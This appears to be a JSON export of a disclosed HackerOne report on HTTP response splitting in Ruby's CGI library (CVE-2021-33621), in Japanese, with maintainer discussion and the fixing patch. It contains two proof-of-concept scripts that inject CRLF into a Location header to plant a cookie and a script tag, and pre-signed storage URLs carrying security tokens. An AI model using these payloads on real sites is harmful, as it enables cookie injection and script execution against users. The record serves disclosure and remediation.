@@ -1,0 +1,542 @@
+{
+  "id": 1204695,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjA0Njk1",
+  "url": "https://hackerone.com/reports/1204695",
+  "title": "RubyのCGIライブラリにHTTPレスポンス分割（HTTPヘッダインジェクション）があり、秘密情報が漏洩する",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-05-21T01:10:02.661Z",
+  "submitted_at": "2021-05-21T01:10:02.734Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "htokumaru",
+    "url": "/htokumaru",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-33621",
+    "CVE-2019-16254"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-11-24T01:46:39.911Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-11-24T01:46:39.817Z",
+  "team_member_agreed_on_going_public_at": "2022-11-23T23:23:01.074Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "PoC1:\n```\n#!/usr/bin/env ruby\nrequire 'cgi'\ncgi = CGI.new\nurl = \"http://example.jp\\r\\nSet-Cookie: foo=bar;\"     # External Parameter\nprint cgi.header({'status' => '302 Found', 'Location' => url})\n```\n\nActual Result1:\n```\n$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru\nHTTP/1.1 302 Found\nDate: Fri, 21 May 2021 00:46:33 GMT\nServer: Apache/2.2.31 (Unix)\nSet-Cookie: foo=bar;\nLocation: http://example.jp\nContent-Length: 0\nContent-Type: text/html\n\n```\n\nこのケースでは不正なクッキーが注入される。\n\n\nPoC2:\n```\n#!/usr/bin/env ruby\nrequire 'cgi'\ncgi = CGI.new\nurl = \"http://example.jp\\r\\nStatus: 500\\r\\n\\r\\n<script>alert(1)</script>\"  # External Parameter\nprint cgi.header({'status' => '302 Found', 'Location' => url})\n```\n\nActual Result2:\n```\n$ curl -s -i http://localhost:8080/cgi-bin/cgi.ru\nHTTP/1.1 500 Internal Server Error\nDate: Fri, 21 May 2021 00:49:44 GMT\nServer: Apache/2.2.31 (Unix)\nLocation: http://example.jp\nConnection: close\nTransfer-Encoding: chunked\nContent-Type: text/html\n\n<script>alert(1)</script>\n\n```\n\nこのケースでは500 Internal Server Errorのため、Locationヘッダは無視され、JavaScriptが実行される。\n\n## Impact\n\n意図しないHTTPレスポンスヘッダやHTTPレスポンスボディを外部から注入できます。\n単純なHTTPヘッダインジェクションでは、クッキーのインジェクションやリダイレクト等が主な影響となりますが、このケースでは、レスポンスボディが注入できるため、不正なJavaScript実行に及ぶため、影響が大きいと考えます。\n\n他の言語の場合、PHPのheader関数は \"\\r\"  \"\\n\"   \"\\r\\n\"   等をすべてエラーにするため、上記の攻撃はできません。\n\n過去のWEBrickやPumaにも類似の脆弱性がありましたが、これらは単独のキャリッジリターン \"\\r\" による攻撃しかできず、リバースプロキシとしてNginxがあれば、Nginx側にてエラーになります。したがって、現実的な危険性はほとんどないと考えます。\n\nhttps://www.ruby-lang.org/en/news/2019/10/01/http-response-splitting-in-webrick-cve-2019-16254/\nhttps://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v\n\n一方、今回報告した問題は、CGIの仕様上ウェブサーバーやリバースプロキシ側でエラーにすることはできないため、影響が現実的です。",
+  "weakness": {
+    "id": 1,
+    "name": "HTTP Response Splitting"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2022-12-23T23:23:01.199Z",
+  "allow_singular_disclosure_after": -23614544.359203145,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "7odamoo",
+    "zy9ard3",
+    "mr-k0anti",
+    "shivammusic",
+    "ittafunahashi",
+    "capta1n_l3vi",
+    "pofb",
+    "crypton_"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.1,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 11829471,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-21T01:32:06.950Z",
+      "updated_at": "2021-05-21T01:32:06.950Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065845Z&X-Amz-Expires=3055&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e8562a11d9ac4358c2c4d1d8e3bf72413eb2a7678f9ff36c84eca26224211c5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11834982,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ご報告ありがとうございます。\n\nチーム内で相談し、この内容は脆弱性として修正を行う予定です。\n",
+      "automated_response": false,
+      "created_at": "2021-05-21T12:25:19.976Z",
+      "updated_at": "2021-05-21T12:25:19.976Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065845Z&X-Amz-Expires=3055&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e8562a11d9ac4358c2c4d1d8e3bf72413eb2a7678f9ff36c84eca26224211c5"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11841233,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ご報告ありがとうございます。\n\nキーや値に \\r や \\n が含まれている場合は例外にする方向で対応しようと思います。\n後日パッチを作成してここに貼り付けますので、その際ご確認頂けると幸いです。",
+      "automated_response": false,
+      "created_at": "2021-05-21T18:49:22.512Z",
+      "updated_at": "2021-05-21T18:49:22.512Z",
+      "actor": {
+        "username": "mame",
+        "cleared": false,
+        "verified": false,
+        "url": "/mame",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11843724,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "承知しました。引き続きよろしくお願いいたします。",
+      "automated_response": false,
+      "created_at": "2021-05-22T01:32:50.024Z",
+      "updated_at": "2021-05-22T01:32:50.024Z",
+      "actor": {
+        "username": "htokumaru",
+        "cleared": false,
+        "verified": false,
+        "url": "/htokumaru",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11889314,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "遅くなりました。ヘッダの生成でCRやLFが混入していたら例外を投げるようにするパッチです。\nもしお気づきの点などあればお教えください。\n\n```diff\ndiff --git a/lib/cgi/core.rb b/lib/cgi/core.rb\nindex bec76e0..62e6068 100644\n--- a/lib/cgi/core.rb\n+++ b/lib/cgi/core.rb\n@@ -188,17 +188,28 @@ class CGI\n   # Using #header with the HTML5 tag maker will create a <header> element.\n   alias :header :http_header\n \n+  def _no_crlf_check(str)\n+    if str\n+      str = str.to_s\n+      raise \"A HTTP status or header field must not include CR and LF\" if str =~ /[\\r\\n]/\n+      str\n+    else\n+      nil\n+    end\n+  end\n+  private :_no_crlf_check\n+\n   def _header_for_string(content_type) #:nodoc:\n     buf = ''.dup\n     if nph?()\n-      buf << \"#{$CGI_ENV['SERVER_PROTOCOL'] || 'HTTP/1.0'} 200 OK#{EOL}\"\n+      buf << \"#{_no_crlf_check($CGI_ENV['SERVER_PROTOCOL']) || 'HTTP/1.0'} 200 OK#{EOL}\"\n       buf << \"Date: #{CGI.rfc1123_date(Time.now)}#{EOL}\"\n-      buf << \"Server: #{$CGI_ENV['SERVER_SOFTWARE']}#{EOL}\"\n+      buf << \"Server: #{_no_crlf_check($CGI_ENV['SERVER_SOFTWARE'])}#{EOL}\"\n       buf << \"Connection: close#{EOL}\"\n     end\n-    buf << \"Content-Type: #{content_type}#{EOL}\"\n+    buf << \"Content-Type: #{_no_crlf_check(content_type)}#{EOL}\"\n     if @output_cookies\n-      @output_cookies.each {|cookie| buf << \"Set-Cookie: #{cookie}#{EOL}\" }\n+      @output_cookies.each {|cookie| buf << \"Set-Cookie: #{_no_crlf_check(cookie)}#{EOL}\" }\n     end\n     return buf\n   end # _header_for_string\n@@ -213,9 +224,9 @@ class CGI\n     ## NPH\n     options.delete('nph') if defined?(MOD_RUBY)\n     if options.delete('nph') || nph?()\n-      protocol = $CGI_ENV['SERVER_PROTOCOL'] || 'HTTP/1.0'\n+      protocol = _no_crlf_check($CGI_ENV['SERVER_PROTOCOL']) || 'HTTP/1.0'\n       status = options.delete('status')\n-      status = HTTP_STATUS[status] || status || '200 OK'\n+      status = HTTP_STATUS[status] || _no_crlf_check(status) || '200 OK'\n       buf << \"#{protocol} #{status}#{EOL}\"\n       buf << \"Date: #{CGI.rfc1123_date(Time.now)}#{EOL}\"\n       options['server'] ||= $CGI_ENV['SERVER_SOFTWARE'] || ''\n@@ -223,38 +234,38 @@ class CGI\n     end\n     ## common headers\n     status = options.delete('status')\n-    buf << \"Status: #{HTTP_STATUS[status] || status}#{EOL}\" if status\n+    buf << \"Status: #{HTTP_STATUS[status] || _no_crlf_check(status)}#{EOL}\" if status\n     server = options.delete('server')\n-    buf << \"Server: #{server}#{EOL}\" if server\n+    buf << \"Server: #{_no_crlf_check(server)}#{EOL}\" if server\n     connection = options.delete('connection')\n-    buf << \"Connection: #{connection}#{EOL}\" if connection\n+    buf << \"Connection: #{_no_crlf_check(connection)}#{EOL}\" if connection\n     type = options.delete('type')\n-    buf << \"Content-Type: #{type}#{EOL}\" #if type\n+    buf << \"Content-Type: #{_no_crlf_check(type)}#{EOL}\" #if type\n     length = options.delete('length')\n-    buf << \"Content-Length: #{length}#{EOL}\" if length\n+    buf << \"Content-Length: #{_no_crlf_check(length)}#{EOL}\" if length\n     language = options.delete('language')\n-    buf << \"Content-Language: #{language}#{EOL}\" if language\n+    buf << \"Content-Language: #{_no_crlf_check(language)}#{EOL}\" if language\n     expires = options.delete('expires')\n     buf << \"Expires: #{CGI.rfc1123_date(expires)}#{EOL}\" if expires\n     ## cookie\n     if cookie = options.delete('cookie')\n       case cookie\n       when String, Cookie\n-        buf << \"Set-Cookie: #{cookie}#{EOL}\"\n+        buf << \"Set-Cookie: #{_no_crlf_check(cookie)}#{EOL}\"\n       when Array\n         arr = cookie\n-        arr.each {|c| buf << \"Set-Cookie: #{c}#{EOL}\" }\n+        arr.each {|c| buf << \"Set-Cookie: #{_no_crlf_check(c)}#{EOL}\" }\n       when Hash\n         hash = cookie\n-        hash.each_value {|c| buf << \"Set-Cookie: #{c}#{EOL}\" }\n+        hash.each_value {|c| buf << \"Set-Cookie: #{_no_crlf_check(c)}#{EOL}\" }\n       end\n     end\n     if @output_cookies\n-      @output_cookies.each {|c| buf << \"Set-Cookie: #{c}#{EOL}\" }\n+      @output_cookies.each {|c| buf << \"Set-Cookie: #{_no_crlf_check(c)}#{EOL}\" }\n     end\n     ## other headers\n     options.each do |key, value|\n-      buf << \"#{key}: #{value}#{EOL}\"\n+      buf << \"#{_no_crlf_check(key)}: #{_no_crlf_check(value)}#{EOL}\"\n     end\n     return buf\n   end # _header_for_hash\ndiff --git a/test/cgi/test_cgi_header.rb b/test/cgi/test_cgi_header.rb\nindex bab2d03..9a3b058 100644\n--- a/test/cgi/test_cgi_header.rb\n+++ b/test/cgi/test_cgi_header.rb\n@@ -176,6 +176,14 @@ class CGIHeaderTest < Test::Unit::TestCase\n   end\n \n \n+  def test_cgi_http_header_crlf_injection\n+    cgi = CGI.new\n+    assert_raise { cgi.http_header(\"text/xhtml\\r\\nBOO\") }\n+    assert_raise { cgi.http_header(\"type\" => \"text/xhtml\\r\\nBOO\") }\n+    assert_raise { cgi.http_header(\"status\" => \"200 OK\\r\\nBOO\") }\n+    assert_raise { cgi.http_header(\"location\" => \"text/xhtml\\r\\nBOO\") }\n+  end\n+\n \n   instance_methods.each do |method|\n     private method if method =~ /^test_(.*)/ && $1 != ENV['TEST']\n\n```",
+      "automated_response": false,
+      "created_at": "2021-05-26T08:18:50.000Z",
+      "updated_at": "2021-05-26T08:18:50.000Z",
+      "actor": {
+        "username": "mame",
+        "cleared": false,
+        "verified": false,
+        "url": "/mame",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11889943,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "パッチありがとうございます。ソースコード確認およびテストにて問題ないと思いました。変数bufにデータを追加する際に、可変の値はすべて_no_crlf_check()を通す方針とお見受けしました。非常に手堅い方法と感じました。対応ありがとうございます。",
+      "automated_response": false,
+      "created_at": "2021-05-26T09:17:10.057Z",
+      "updated_at": "2021-05-26T09:17:10.057Z",
+      "actor": {
+        "username": "htokumaru",
+        "cleared": false,
+        "verified": false,
+        "url": "/htokumaru",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11909294,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ご確認ありがとうございました。それではCVEを申請しておきます。このパッチは次のリリース（か、間に合わなければその次）に含めたいと思います。",
+      "automated_response": false,
+      "created_at": "2021-05-28T02:55:21.187Z",
+      "updated_at": "2021-05-28T02:55:21.187Z",
+      "actor": {
+        "username": "mame",
+        "cleared": false,
+        "verified": false,
+        "url": "/mame",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 11909624,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "連絡ありがとうございます。承知しました。",
+      "automated_response": false,
+      "created_at": "2021-05-28T04:40:39.681Z",
+      "updated_at": "2021-05-28T04:40:39.681Z",
+      "actor": {
+        "username": "htokumaru",
+        "cleared": false,
+        "verified": false,
+        "url": "/htokumaru",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/sjwFRaTog4dFsHBYahCn8L8c/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 12309189,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-01T07:36:54.682Z",
+      "updated_at": "2021-07-01T07:36:54.682Z",
+      "cve_ids": [
+        "CVE-2021-33621"
+      ],
+      "actor": {
+        "username": "mame",
+        "cleared": false,
+        "verified": false,
+        "url": "/mame",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 16785240,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-05-20T02:37:24.908Z",
+      "updated_at": "2022-05-20T02:37:24.908Z",
+      "actor": {
+        "username": "knu",
+        "cleared": false,
+        "verified": false,
+        "url": "/knu",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/215/258/93558710bf4b20f730f1a5f4e4d8df29faeedfc7_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19313949,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/ として cgi ライブラリの修正バージョンをリリースしました",
+      "automated_response": false,
+      "created_at": "2022-11-23T02:52:26.605Z",
+      "updated_at": "2022-11-23T02:52:26.605Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065845Z&X-Amz-Expires=3055&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSy